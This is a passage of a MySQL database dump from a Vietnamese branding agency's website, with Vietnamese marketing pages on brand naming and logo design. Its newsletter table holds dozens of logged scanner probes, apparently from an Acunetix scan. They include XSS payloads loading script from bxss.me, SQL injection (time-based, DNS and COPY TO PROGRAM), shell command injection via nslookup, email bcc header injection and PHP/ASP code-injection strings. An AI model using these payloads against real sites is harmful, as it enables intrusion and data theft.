(110, 0, NULL, NULL, ')', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:04', '2018-07-03 04:36:04'),
(111, 0, NULL, NULL, '!(()&&!|*|*|', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:05', '2018-07-03 04:36:05'),
(112, 0, NULL, NULL, '^(#$!@#$)(()))******', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:06', '2018-07-03 04:36:06'),
(113, 0, NULL, NULL, '\'\"()', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:09', '2018-07-03 04:36:09'),
(114, 0, NULL, NULL, ';print(md5(acunetix_wvs_security_test));', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:12', '2018-07-03 04:36:12'),
(115, 0, NULL, NULL, '\';print(md5(acunetix_wvs_security_test));$a=\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:12', '2018-07-03 04:36:12'),
(116, 0, NULL, NULL, '\";print(md5(acunetix_wvs_security_test));$a=\"', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:13', '2018-07-03 04:36:13'),
(117, 0, NULL, NULL, 'http://testasp.vulnweb.com/t/xss.html?%00.jpg', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:14', '2018-07-03 04:36:14'),
(118, 0, NULL, NULL, 'newsletter', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:14', '2018-07-03 04:36:14'),
(119, 0, NULL, NULL, 'http://hitSj4CfjPcCC.bxss.me/', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:16', '2018-07-03 04:36:16'),
(120, 0, NULL, NULL, 'newsletter/.', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:16', '2018-07-03 04:36:16'),
(121, 0, NULL, NULL, '${@print(md5(acunetix_wvs_security_test))}', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:19', '2018-07-03 04:36:19'),
(122, 0, NULL, NULL, ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:20', '2018-07-03 04:36:20'),
(123, 0, NULL, NULL, '${@print(md5(acunetix_wvs_security_test))}\\', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:23', '2018-07-03 04:36:23'),
(124, 0, NULL, NULL, '/www.vulnweb.com', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:23', '2018-07-03 04:36:23'),
(125, 0, NULL, NULL, '\'\"', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:26', '2018-07-03 04:36:26'),
(126, 0, NULL, NULL, '<!--', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:26', '2018-07-03 04:36:26'),
(127, 0, NULL, NULL, 'sample%40email.tst\'\"()&%<acx><ScRiPt >vrLI(9714)</ScRiPt>', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:28', '2018-07-03 04:36:28'),
(128, 0, NULL, NULL, '\'\"()&%<acx><ScRiPt >vrLI(9167)</ScRiPt>', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:28', '2018-07-03 04:36:28'),
(129, 0, NULL, NULL, 'sample%40email.tst9919960', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:29', '2018-07-03 04:36:29'),
(130, 0, NULL, NULL, '1\'\"', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:36:31', '2018-07-03 04:36:31'),
(131, 0, NULL, NULL, 'response.write(9533748*9453626)', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:00', '2018-07-03 04:37:00'),
(132, 0, NULL, NULL, '\'+response.write(9533748*9453626)+\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:01', '2018-07-03 04:37:01'),
(133, 0, NULL, NULL, '\"+response.write(9533748*9453626)+\"', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:02', '2018-07-03 04:37:02'),
(134, 0, NULL, NULL, 'sample%40email.tst</script><svg/onload=\'+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.src=(/,/+/bxss.me\\/s?u=043737&r=53-472&h=53-e93ec-2&/).slice(2),document.documentElement.appendChild(s))//\'>', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:05', '2018-07-03 04:37:05'),
(135, 0, NULL, NULL, 'sample%40email.tst\'>\"><script src=http://bxss.me/s?u=043737&r=53-473&h=53-e93ec-1></script><tcpdf method=\"addTTFFont\" params=\"%5B%22%5C%2Fetc%5C%2Fhosts%22%2C%22TrueType%22%2C%22%22%2C255%2C%22ftp%3A%5C%2F%5C%2Fftpadmin%3AzaNEgbe8XcCb%40bxss.me%3A999%5C%2Fbxss,043737,53-473,53,e93ec,%22%5D\"/>', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:06', '2018-07-03 04:37:06'),
(136, 0, NULL, NULL, '-1 OR 2+548-548-1=0+0+0+1 --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:06', '2018-07-03 04:37:06'),
(137, 0, NULL, NULL, '-1 OR 2+12-12-1=0+0+0+1', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:07', '2018-07-03 04:37:07'),
(138, 0, NULL, NULL, '-1\' OR 2+257-257-1=0+0+0+1 --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:07', '2018-07-03 04:37:07'),
(139, 0, NULL, NULL, '$(nslookup dns.ce.\\043737.53-476.53.e93ec.\\1.bxss.me)', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:08', '2018-07-03 04:37:08'),
(140, 0, NULL, NULL, '-1\' OR 2+86-86-1=0+0+0+1 or \'GeWSfdKX\'=\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:08', '2018-07-03 04:37:08'),
(141, 0, NULL, NULL, '&nslookup dns.ce.\\043737.53-477.53.e93ec.\\1.bxss.me&\'\\\"`0&nslookup dns.ce.\\043737.53-477.53.e93ec.\\1.bxss.me&`\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:08', '2018-07-03 04:37:08'),
(142, 0, NULL, NULL, '-1\" OR 2+227-227-1=0+0+0+1 --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:09', '2018-07-03 04:37:09'),
(143, 0, NULL, NULL, 'supYaSH8', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:12', '2018-07-03 04:37:12'),
(144, 0, NULL, NULL, 'yKCbyFfw\'; waitfor delay \'0:0:9\' --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:12', '2018-07-03 04:37:12'),
(145, 0, NULL, NULL, 'N9z0MGdy\';select pg_sleep(9); --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:13', '2018-07-03 04:37:13'),
(146, 0, NULL, NULL, 'sample@email.tst\nbcc:043737.53-480.53.e93ec.1@bxss.me', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:13', '2018-07-03 04:37:13'),
(147, 0, NULL, NULL, 'to@example.com>\r\nbcc:043737.53-481.53.e93ec.1@bxss.me', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:14', '2018-07-03 04:37:14'),
(148, 0, NULL, NULL, 'lTAjcDjY\');select pg_sleep(9); --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:16', '2018-07-03 04:37:16'),
(149, 0, NULL, NULL, 'rFd0Fj6o\'));select pg_sleep(9); --', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:17', '2018-07-03 04:37:17'),
(150, 0, NULL, NULL, '\'||UTL_INADDR.get_host_address(\'dns.\'||\'sqli.043737.53-484.53.e93ec.1.bxss\'||\'.me\')||\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:17', '2018-07-03 04:37:17'),
(151, 0, NULL, NULL, 'sample%40email.tst\';copy (select \'\') to program \'nslookup dns.sqli.\\043737.53-485.53.e93ec.\\1.bxss.me', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:18', '2018-07-03 04:37:18'),
(152, 0, NULL, NULL, '602\'', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:19', '2018-07-03 04:37:19'),
(153, 0, NULL, NULL, '${9999323+9999535}', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:20', '2018-07-03 04:37:20'),
(154, 0, NULL, NULL, 'sample@email.tst&n969679=v952437', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:36', '2018-07-03 04:37:36'),
(155, 0, NULL, NULL, 'http://hitMUyt21hUTJ.bxss.me/', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:37:59', '2018-07-03 04:37:59'),
(156, 0, NULL, NULL, '\\', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:38:01', '2018-07-03 04:38:01'),
(157, 0, NULL, NULL, '@@Gt0rT', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:38:02', '2018-07-03 04:38:02'),
(158, 0, NULL, NULL, 'JyI=', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:38:03', '2018-07-03 04:38:03'),
(159, 0, NULL, NULL, 'sample%40email.tst\'\"()&%<acx><ScRiPt >SPMi(9363)</ScRiPt>', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:38:18', '2018-07-03 04:38:18'),
(160, 0, NULL, NULL, '\'\"()&%<acx><ScRiPt >SPMi(9786)</ScRiPt>', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:38:19', '2018-07-03 04:38:19'),
(161, 0, NULL, NULL, 'sample%40email.tst9559135', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:38:19', '2018-07-03 04:38:19'),
(162, 0, NULL, NULL, '@@DRfMZ', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 04:44:17', '2018-07-03 04:44:17'),
(163, 0, NULL, NULL, '1acuotODIoZUfQ', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 06:22:27', '2018-07-03 06:22:27'),
(164, 0, NULL, NULL, '1acuySeoUdUKeU', NULL, NULL, NULL, NULL, 1, 0, 'newsletter', 0, '2018-07-03 06:22:27', '2018-07-03 06:22:27');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `news_categories`
--

CREATE TABLE `news_categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `name_en` varchar(250) COLLATE utf8_unicode_ci DEFAULT NULL,
  `alias` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `alias_en` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `photo` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `mota` text COLLATE utf8_unicode_ci,
  `mota_en` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '0',
  `lever` int(11) NOT NULL DEFAULT '0',
  `parent_id` int(11) NOT NULL DEFAULT '0',
  `title` text COLLATE utf8_unicode_ci,
  `title_en` text CHARACTER SET utf8,
  `keyword` longtext COLLATE utf8_unicode_ci,
  `keyword_en` text CHARACTER SET utf8,
  `description` longtext COLLATE utf8_unicode_ci,
  `description_en` text COLLATE utf8_unicode_ci,
  `com` text COLLATE utf8_unicode_ci,
  `stt` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `background` text COLLATE utf8_unicode_ci,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `news_categories`
--

INSERT INTO `news_categories` (`id`, `name`, `name_en`, `alias`, `alias_en`, `photo`, `mota`, `mota_en`, `status`, `lever`, `parent_id`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `com`, `stt`, `created_at`, `background`, `updated_at`) VALUES
(47, 'Tin tức', NULL, 'tin-tuc', '', '', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 1, '2017-12-21 04:11:30', '', '2017-12-20 21:11:30'),
(50, 'Tin tuyển dụng', NULL, 'tin-tuyen-dung', '', '', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tuyen-dung', 1, '2017-12-20 21:41:18', '', '2017-12-20 21:41:18'),
(51, 'Việc làm', NULL, 'viec-lam', '', '', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tuyen-dung', 2, '2017-12-20 21:44:53', '', '2017-12-20 21:44:53'),
(54, 'Sự khác biệtx', NULL, 'su-khac-bietx', '', '', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'bai-viet', 2, '2017-12-22 02:37:22', '', '2017-12-21 19:37:22'),
(55, 'Quan hệ cổ đôngx', NULL, 'quan-he-co-dongx', '', '', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'bai-viet', 3, '2017-12-22 02:37:31', '', '2017-12-21 19:37:31'),
(45, 'Tin hoạt động', 'Action news', 'tin-hoat-dong', 'action-news', '', NULL, NULL, 1, 0, 47, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 1, '2017-12-22 02:49:41', '', '2017-12-21 19:49:41'),
(46, 'Tin chứng khoán', NULL, 'tin-chung-khoan', '', '', NULL, NULL, 1, 0, 47, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 2, '2017-12-21 04:11:41', '', '2017-12-20 21:11:41'),
(56, 'Thiết kế thương hiệu', 'BRAND DESIGN', 'thiet-ke-thuong-hieu', 'brand-design', '', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 1, '2018-05-30 04:14:00', '', '2018-05-29 21:14:00'),
(57, 'Ứng dụng tương tác', 'Online  Interactive', 'ung-dung-tuong-tac', 'online-interactive', '', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 2, '2018-05-30 04:22:11', '', '2018-05-29 21:22:11'),
(58, 'Truyền thông maketing', 'MARKETING COMM', 'truyen-thong-maketing', 'marketing-comm', '', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 3, '2018-05-30 04:42:59', '', '2018-05-29 21:42:59'),
(59, 'Đặt tên thương hiệu', 'Đặt tên và Slogan', 'dat-ten-thuong-hieu', 'dat-ten-va-slogan', '', '<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Với bất cứ doanh nghiệp n&agrave;o nếu muốn ph&aacute;t triển nhanh ch&oacute;ng, dễ d&agrave;ng tiếp cận tới người d&ugrave;ng th&igrave; việc <strong><em><u>đặt t&ecirc;n thương hiệu</u></em></strong> sao cho thỏa đ&aacute;ng v&agrave; ph&ugrave; hợp lu&ocirc;n l&agrave; yếu tố đầu ti&ecirc;n cần quan t&acirc;m. Đặt t&ecirc;n thương hiệu th&iacute;ch hợp cũng sẽ gi&uacute;p qu&aacute; tr&igrave;nh truyền th&ocirc;ng v&agrave; marketing c&agrave;ng th&ecirc;m thuận lợi hơn hẳn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/Name%20Brand.jpg\" alt=\"\" width=\"2108\" height=\"904\" /></span></p>\r\n<h2 style=\"text-align: justify;\">&nbsp;</h2>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">1. Những y&ecirc;u cầu cần c&oacute; khi đặt t&ecirc;n thương hiệu</span></strong></span></h2>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Tất nhi&ecirc;n khi đặt t&ecirc;n thương hiệu điều đầu ti&ecirc;n l&agrave; cần đảm bảo t&ecirc;n thương hiệu ho&agrave;n to&agrave;n mới, c&oacute; thể bảo hộ được về mặt ph&aacute;p l&yacute;, tr&aacute;nh bị nh&aacute;i g&acirc;y rủi ro cho doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Tuy nhi&ecirc;n để t&ecirc;n thương hiệu dễ d&agrave;ng tiếp cận tới người d&ugrave;ng th&igrave; khi đặt t&ecirc;n thương hiệu ch&uacute;ng ta cũng cần đảm bảo t&ecirc;n thương hiệu phải đơn giản, dễ nhớ nhằm gi&uacute;p người d&ugrave;ng ghi nhớ được t&ecirc;n thương hiệu dễ d&agrave;ng hơn, tạo ấn tượng được trong l&ograve;ng người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Khi đặt t&ecirc;n thương hiệu cần phải ch&uacute; &yacute; tr&aacute;nh những li&ecirc;n tưởng ti&ecirc;u cực về &acirc;m hoặc nghĩa để tr&aacute;nh những thứ ti&ecirc;u cưc, nhạy cảm v&agrave; đảm bảo t&ecirc;n thương hiệu kh&ocirc;ng bị tr&ugrave;ng lặp với những thương hiệu kh&aacute;c.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">T&ecirc;n thương hiệu khi đặt phải đảm bảo sự kh&aacute;c biệt v&agrave; độc đ&aacute;o với đối thủ cạnh tranh, nhưng cũng cần đảm bảo hể hiện được đ&uacute;ng ng&agrave;nh nghề hoặc sản phẩm của thương hiệu, gi&uacute;p người d&ugrave;ng li&ecirc;n tưởng tới sản phẩm, dịch vụ của bạn dễ d&agrave;ng hơn ngay từ thời điểm nghe được t&ecirc;n thương hiệu, từ đ&oacute; tạo được ấn tượng mạnh với kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Tất nhi&ecirc;n khi đặt t&ecirc;n thương hiệu ch&uacute;ng ta cũng cần căn cứ theo từng sản phẩm, dịch vụ để x&aacute;c định ph&acirc;n kh&uacute;c kh&aacute;ch h&agrave;ng, từ đ&oacute; c&oacute; c&aacute;ch đặt t&ecirc;n thương hiệu th&iacute;ch đ&aacute;ng nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Chẳng hạn với&nbsp; những dịch vụ hay mặt h&agrave;ng xa xỉ phẩm hướng tới kh&aacute;ch h&agrave;ng sang trọng, cao cấp th&igrave; t&ecirc;n thương hiệu cần mang lại cảm gi&aacute;c cao cấp, sang trọng hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Tuy nhi&ecirc;n với những mặt h&agrave;ng b&igrave;nh d&acirc;n, thường ng&agrave;y th&igrave; t&ecirc;n thương hiệu n&ecirc;n ch&uacute; trọng t&iacute;nh đơn giản, dễ nhớ, phổ th&ocirc;ng để kh&aacute;ch h&agrave;ng c&oacute; thể đọc được v&agrave; ghi nhớ tốt nhất, tạo ấn tượng tới người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/1.jpg\" alt=\"\" width=\"1024\" height=\"1024\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">2. Đặt t&ecirc;n thương hiệu đ&uacute;ng chuẩn tại Brity</span></strong></span></h2>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Nếu bạn kh&ocirc;ng thể t&igrave;m kiếm được t&ecirc;n thương hiệu đ&uacute;ng chuẩn cho doanh nghiệp, đảm bảo t&iacute;nh quảng c&aacute;o cao nhất cho dịch vụ, sản phẩm của doanh nghiệp th&igrave; c&oacute; thể t&igrave;m tới dịch vụ đặt t&ecirc;n thương hiệu tại Brity, tại đ&acirc;y ch&uacute;ng t&ocirc;i c&oacute; những đội ngũ nh&acirc;n vi&ecirc;n s&aacute;ng tạo, chuy&ecirc;n nghiệp với t&iacute;nh chuy&ecirc;n m&ocirc;n cao, kinh nghiệm đ&agrave;y dặn, đảm bảo phục vụ tốt nhất cho nhu cầu dịch vụ của kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Với đội ngũ nh&acirc;n vi&ecirc;n đầy s&aacute;ng tạo tại Brity lu&ocirc;n cam kết mang tới cho doanh nghiệp những t&ecirc;n thương hiệu độc đ&aacute;o, ph&ugrave; hợp với ph&acirc;n kh&uacute;c thị trường, gắn kết chặt chẽ với sản phẩm v&agrave; dịch vụ của bạn, đảm bảo c&oacute; thể thu h&uacute;t được nh&oacute;m kh&aacute;ch h&agrave;ng tiềm năng một c&aacute;ch nhanh ch&oacute;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">Đối với dịch vụ đặt t&ecirc;n thương hiệu cho doanh nghiệp, đội ngũ nh&acirc;n sự tại Brity lu&ocirc;n c&oacute; sự kết hợp ho&agrave;n hảo giữa ph&acirc;n t&iacute;ch v&agrave; nghi&ecirc;n cứu thị trường cũng như thị hiếu của người d&ugrave;ng, từ đ&oacute; tăng cường t&iacute;nh s&aacute;ng tạo v&agrave; b&aacute;m s&aacute;t thực tế, mang lại sự kh&aacute;c biệt nhưng gi&aacute; trị cho thương hiệu của bạn, đảm bảo thấu hiểu người d&ugrave;ng tốt nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt; font-family: \'times new roman\', times, serif;\">&nbsp;<img src=\"http://brity.vn/upload/dat%20ten%20thuong%20hieu.jpg\" alt=\"\" width=\"884\" height=\"490\" /></span></p>', NULL, 1, 0, 56, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 1, '2018-07-19 09:23:55', '', '2018-07-19 02:23:55'),
(60, 'Thiết kế Logo', 'Logo Design', 'thiet-ke-logo', 'logo-design', '', '<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Logo l&agrave; h&igrave;nh ảnh đại diện cho c&ocirc;ng ty, l&agrave; h&igrave;nh ảnh mang tới uy t&iacute;n v&agrave; tiếng vang cho c&ocirc;ng ty g&acirc;y quen thuộc với kh&aacute;ch h&agrave;ng v&agrave; gi&uacute;p kh&aacute;ch h&agrave;ng dễ d&agrave;ng nhận diện được thương hiệu v&agrave; sản phẩm của doanh nghiệp. Đ&acirc;y cũng l&agrave; l&yacute; do tại sao bất cứ doanh nghiệp n&agrave;o cũng cần ch&uacute; trọng tới <strong><em><u>thiết kế logo</u></em></strong> cho doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/Logo%20Design.jpg\" alt=\"\" width=\"2048\" height=\"1367\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">1. N&ecirc;n thiết kế logo tại đ&acirc;u ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bất cứ một doanh nghiệp n&agrave;o khi muốn x&acirc;y dựng h&igrave;nh ảnh cũng như chỗ đứng của m&igrave;nh tr&ecirc;n thị trường đều cần ch&uacute; trọng tới thiết kế logo, đ&acirc;y cũng l&agrave; bước đầu gi&uacute;p doanh nghiệp khởi động x&acirc;y dựng thương hiệu của m&igrave;nh nhanh ch&oacute;ng hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Ch&iacute;nh v&igrave; vậy việc thiết kế logo tốt nhất bạn n&ecirc;n t&igrave;m kiếm tới những đơn vị thiết kế logo uy t&iacute;n v&agrave; chuy&ecirc;n nghiệp như Brity để đảm bảo ho&agrave;n thiện logo doanh nghiệp ho&agrave;n hảo nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Tại Brity với đội ngũ thiết kế c&oacute; chuy&ecirc;n m&ocirc;n cao về mỹ thuật đồ họa, c&oacute; kinh nghiệm thiết kế logo của nhiều dự &aacute;n lớn v&agrave; x&acirc;y dựng c&aacute;c c&acirc;u chuyện thương hiệu th&ocirc;ng qua qu&aacute; tr&igrave;nh l&agrave;m việc, đảm bảo mang tới cho doanh nghiệp của bạn một h&igrave;nh tượng ho&agrave;n hảo trong mắt kh&aacute;ch h&agrave;ng, tạo dựng linh hồn nền tảng cho x&acirc;y dựng doanh nghiệp v&agrave; nghi&ecirc;n cứu sản phẩm.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Brity với nguy&ecirc;n tắc l&agrave;m việc đột ph&aacute; &yacute; tưởng, đảm bảo kỹ thuật chuẩn mực v&agrave; năng lực s&aacute;ng tạo sắc m&agrave;u độc đ&aacute;o chắc chắn sẽ mang tới cho kh&aacute;ch h&agrave;ng những sản phẩm h&agrave;i l&ograve;ng nhất.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/Team%20Work_1.jpg\" alt=\"\" width=\"1500\" height=\"764\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">2. Quy tr&igrave;nh l&agrave;m việc tại Brity</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Doanh nghiệp khi lựa chọn thiết kế logo tại Brity ho&agrave;n to&agrave;n c&oacute; thể y&ecirc;n t&acirc;m với quy tr&igrave;nh l&agrave;m việc ho&agrave;n mỹ tại đ&acirc;y. Với quy tr&igrave;nh &ldquo;đơn giản &ndash; nhanh ch&oacute;ng &ndash; s&aacute;ng tạo &ndash; th&acirc;n thiện&ldquo; v&agrave; s&aacute;ng tạo logo b&aacute;m s&aacute;t v&agrave;o đặc điểm sản phẩm cũng như dịch vụ của bạn, trải qua qu&aacute; tr&igrave;nh nghi&ecirc;n cứu, ph&acirc;n t&iacute;ch v&agrave; s&aacute;ng tạo nhằm hiểu r&otilde; hơn về cơ hội, nhu cầu của doanh nghiệp, ph&acirc;n t&iacute;ch kh&aacute;ch quan thị trường để tạo ra những th&agrave;nh phẩm logo độc đ&aacute;o nhưng gần gũi, kết nối ho&agrave;n to&agrave;n với c&acirc;u chuyện thương hiệu của doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">L&agrave; đối t&aacute;c của nhiều doanh nghiệp lớn trong nước, với bất cứ kh&aacute;ch h&agrave;ng n&agrave;o đều được Brity tư vấn v&agrave; đề xuất những mẫu logo thiết kế ph&ugrave; hợp với quy m&ocirc; c&ugrave;ng lĩnh vực hoạt động của doanh nghiệp, đảm bảo mang lại sự h&agrave;i l&ograve;ng tối đa cho kh&aacute;ch h&agrave;ng c&ugrave;ng với hiệu quả dịch vụ vượt bậc, tạo dựng mối quan hệ th&acirc;n thiết với kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đến với Brity kh&aacute;ch h&agrave;ng sẽ được đội ngũ quản l&yacute; tư vấn chu đ&aacute;o về qu&aacute; tr&igrave;nh x&acirc;y dựng thương hiệu cũng như thiết kế logo, lu&ocirc;n đồng h&agrave;nh c&ugrave;ng kh&aacute;ch h&agrave;ng để đảm bảo lợi &iacute;ch tối đa cho 